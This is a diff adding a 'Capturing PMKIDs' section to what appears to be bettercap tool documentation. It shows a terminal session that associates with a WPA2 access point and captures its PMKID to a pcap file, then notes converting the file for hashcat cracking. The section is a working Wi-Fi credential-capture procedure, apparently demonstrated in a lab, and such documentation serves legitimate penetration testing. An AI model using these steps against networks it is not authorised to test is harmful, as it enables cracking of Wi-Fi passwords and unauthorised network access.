@@ -120,6 +120,27 @@ sudo bettercap -iface <wifi-interface>
 
 ![Example](images/example-2.png)
 
+### Capturing PMKIDs
+
+This can also be done by the [hcxtools]({{< ref "hcxtools" >}})
+
+```plain
+bettercap v2.31.0 (built for linux arm with go1.16.2) [type 'help' for a list of commands]
+
+ mon0  » wifi.recon on
+[01:52:35] [sys.log] [inf] wifi using interface mon0 (b8:27:eb:63:d9:2e)
+ mon0  » [01:52:35] [sys.log] [inf] wifi started (min rssi: -200 dBm)
+ mon0  » [01:52:35] [sys.log] [inf] wifi channel hopper started.
+ mon0  » [01:52:35] [wifi.ap.new] wifi access point OFFSEC-G (-66 dBm) detected as c8:12:34:56:78:e1 (Hewlett Packard Enterprise).
+
+ mon0  » wifi.assoc c8:12:34:56:78:e1
+ mon0  » [01:52:59] [sys.log] [inf] wifi sending association request to AP OFFSEC-G (channel:11 encryption:WPA2)
+ mon0  » [01:52:59] [sys.log] [war] wifi error while hopping to channel 12: iw: out= err=exit status 234
+ mon0  » [01:52:59] [wifi.client.handshake] captured b8:12:34:56:78:2e -> OFFSEC-G (c8:12:34:56:78:e1) RSN PMKID to /root/bettercap-wifi-handshakes.pcap
+```
+
+The `/root/bettercap-wifi-handshakes.pcap` file can be converted with [hcxtools]({{< ref "hcxtools" >}}) to [hashcat]({{< ref "hashcat" >}}) format.
+
 ### Troubleshooting
 
 #### libpcap not found
